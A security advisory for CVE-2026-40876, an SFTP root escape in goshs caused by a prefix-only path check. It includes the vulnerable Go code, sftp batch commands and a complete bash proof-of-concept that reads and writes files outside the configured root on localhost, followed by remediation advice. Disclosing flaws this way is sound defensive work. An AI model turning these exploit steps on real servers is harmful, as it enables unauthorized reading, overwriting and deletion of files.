# [H] SFTP root escape via prefix-based path validation in goshs

## Summary
Severity: High
Advisory: GHSA-5h6h-7rc9-3824
CVE: CVE-2026-40876
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-5h6h-7rc9-3824
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs` — affected >=0
- Go: `github.com/patrickhener/goshs/v2` — affected >=0 <2.0.0

## Details
### Summary
goshs contains an SFTP root escape caused by prefix-based path validation. An authenticated SFTP user can read from and write to filesystem paths outside the configured SFTP root, which breaks the intended jail boundary and can expose or modify unrelated server files.

### Details
The SFTP subsystem routes requests through `sftpserver/sftpserver.go:99-126` into `DefaultHandler.GetHandler()` in `sftpserver/handler.go:90-112`, which forwards file operations into `readFile`, `writeFile`, `listFile`, and `cmdFile`. All of those sinks rely on `sanitizePath()` in `sftpserver/helper.go:47-59`. The vulnerable logic is:

```go
cleanPath = filepath.Clean("/" + clientPath)
if !strings.HasPrefix(cleanPath, sftpRoot) {
    return "", errors.New("access denied: outside of webroot")
}
```

This is a raw string-prefix comparison, not a directory-boundary check. Because of that, if the configured root is `/tmp/goshsroot`, then a sibling path such as `/tmp/goshsroot_evil/secret.txt` incorrectly passes validation since it starts with the same byte prefix.

That unsafe value then reaches filesystem sinks including:

- `os.Open` in `sftpserver/helper.go:80-94`
- `os.Create` in `sftpserver/helper.go:139-152`
- `os.Rename` in `sftpserver/helper.go:214-221`
- `os.RemoveAll` in `sftpserver/helper.go:231-232`
- `os.Mkdir` in `sftpserver/helper.go:242-243`

This means an authenticated SFTP user can escape the configured jail and read, create, upload, rename, or delete content outside the intended root directory.

### PoC
The configured SFTP root was `/tmp/goshsroot`, but the SFTP client was still able to access `/tmp/goshsroot_evil/secret.txt` and create `/tmp/goshsroot_owned/pwned.txt`, both of which are outside the configured root.

Manual verification commands used:

`Terminal 1`

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta4'
go build -o /tmp/goshs_beta4 ./

rm -rf /tmp/goshsroot /tmp/goshsroot_evil /tmp/goshsroot_owned /tmp/outside_sftp.txt /tmp/local_upload.txt /tmp/goshs_beta4_client_key
mkdir -p /tmp/goshsroot /tmp/goshsroot_evil
printf 'outside secret\n' > /tmp/goshsroot_evil/secret.txt
printf 'proof via sftp write\n' > /tmp/local_upload.txt
cp sftpserver/goshs_client_key /tmp/goshs_beta4_client_key
chmod 600 /tmp/goshs_beta4_client_key

/tmp/goshs_beta4 -sftp -d /tmp/goshsroot --sftp-port 2222 \
  --sftp-keyfile sftpserver/authorized_keys \
  --sftp-host-keyfile sftpserver/goshs_host_key_rsa
```

`Terminal 2`

```bash
printf 'ls /tmp/goshsroot_evil\nget /tmp/goshsroot_evil/secret.txt /tmp/outside_sftp.txt\nmkdir /tmp/goshsroot_owned\nbye\n' | \
sftp -i /tmp/goshs_beta4_client_key -P 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -b - foo@127.0.0.1

printf 'put /tmp/local_upload.txt /tmp/goshsroot_owned/pwned.txt\nbye\n' | \
sftp -i /tmp/goshs_beta4_client_key -P 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -b - foo@127.0.0.1

cat /tmp/outside_sftp.txt
cat /tmp/goshsroot_owned/pwned.txt
```

Expected result:

- `ls /tmp/goshsroot_evil` succeeds even though that path is outside `/tmp/goshsroot`
- `cat /tmp/outside_sftp.txt` prints `outside secret`
- `cat /tmp/goshsroot_owned/pwned.txt` prints `proof via sftp write`

PoC Video 1:

https://github.com/user-attachments/assets/d2c96301-afc8-4ddc-b008-74b235f94e31



Single-script verification:

```bash
'/Users/r1zzg0d/Documents/CVE hunting/output/poc/gosh_poc1'
```

`gosh_poc1` script content:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO='/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta4'
BIN='/tmp/goshs_beta4_sftp_escape'
ROOT='/tmp/goshsroot'
OUTSIDE='/tmp/goshsroot_evil'
OWNED='/tmp/goshsroot_owned'
CLIENT_KEY='/tmp/goshs_beta4_client_key'
DOWNLOAD='/tmp/outside_sftp.txt'
UPLOAD_SRC='/tmp/local_upload.txt'
PORT='2222'
SERVER_PID=""

cleanup() {
  if [[ -n "${SERVER_PID:-}" ]]; then
    kill "${SERVER_PID}" >/dev/null 2>&1 || true
    wait "${SERVER_PID}" 2>/dev/null || true
  fi
}
trap cleanup EXIT

echo '[1/6] Building goshs beta.4'
cd "${REPO}"
go build -o "${BIN}" ./

echo '[2/6] Preparing root and sibling paths'
rm -rf "${ROOT}" "${OUTSIDE}" "${OWNED}" "${DOWNLOAD}" "${UPLOAD_SRC}" "${CLIENT_KEY}"
mkdir -p "${ROOT}" "${OUTSIDE}"
printf 'outside secret\n' > "${OUTSIDE}/secret.txt"
printf 'proof via sftp write\n' > "${UPLOAD_SRC}"
cp "${REPO}/sftpserver/goshs_client_key" "${CLIENT_KEY}"
chmod 600 "${CLIENT_KEY}"

echo '[3/6] Starting SFTP server'
"${BIN}" -sftp -d "${ROOT}" --sftp-port "${PORT}" \
  --sftp-keyfile "${REPO}/sftpserver/authorized_keys" \
  --sftp-host-keyfile "${REPO}/sftpserver/goshs_host_key_rsa" \
  >/tmp/gosh_poc1.log 2>&1 &
SERVER_PID=$!

for _ in $(seq 1 20); do
  if python3 - <<PY
import socket
s = socket.socket()
try:
    s.connect(("127.0.0.1", ${PORT}))
    raise SystemExit(0)
except OSError:
    raise SystemExit(1)
finally:
    s.close()
PY
  then
    break
  fi
  sleep 1
done

echo '[4/6] Listing and downloading path outside configured root'
printf 'ls /tmp/goshsroot_evil\nget /tmp/goshsroot_evil/secret.txt /tmp/outside_sftp.txt\nmkdir /tmp/goshsroot_owned\nbye\n' | \
  sftp -i "${CLIENT_KEY}" -P "${PORT}" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -b - foo@127.0.0.1

echo '[5/6] Writing a new file outside configured root'
printf 'put /tmp/local_upload.txt /tmp/goshsroot_owned/pwned.txt\nbye\n' | \
  sftp -i "${CLIENT_KEY}" -P "${PORT}" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -b - foo@127.0.0.1

echo '[6/6] Verifying outside-root read and write'
echo "Downloaded content: $(cat "${DOWNLOAD}")"
echo "Written content: $(cat "${OWNED}/pwned.txt")"

if [[ "$(cat "${DOWNLOAD}")" == 'outside secret' ]] && [[ "$(cat "${OWNED}/pwned.txt")" == 'proof via sftp write' ]]; then
  echo '[RESULT] VULNERABLE: authenticated SFTP user escaped the configured root'
else
  echo '[RESULT] NOT REPRODUCED'
  exit 1
fi
```

PoC Video 2:

https://github.com/user-attachments/assets/25e7a4d7-6ec7-40a6-b3d4-d66df3ea3e5f



### Impact
This is a path traversal / jail escape in the SFTP service. Any authenticated SFTP user can break out of the configured root and access sibling filesystem paths that were never meant to be exposed through goshs. In practice this can lead to unauthorized file disclosure, arbitrary file upload outside the shared root, unwanted directory creation, overwrite of sensitive files, or data deletion depending on the reachable path and server permissions.

### Remediation
Suggested fixes:

1. Replace the raw prefix check with a real directory-boundary validation such as requiring either exact root equality or `root + path separator` as the prefix.
2. Reuse the hardened HTTP-style path sanitizer across SFTP as well, so all file-serving modes share the same boundary logic.
3. Add regression tests for sibling-prefix cases like `/tmp/goshsroot_evil`, not only `..` traversal payloads.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-5h6h-7rc9-3824
- https://nvd.nist.gov/vuln/detail/CVE-2026-40876
- https://github.com/patrickhener/goshs
- https://github.com/patrickhener/goshs/releases/tag/v2.0.0
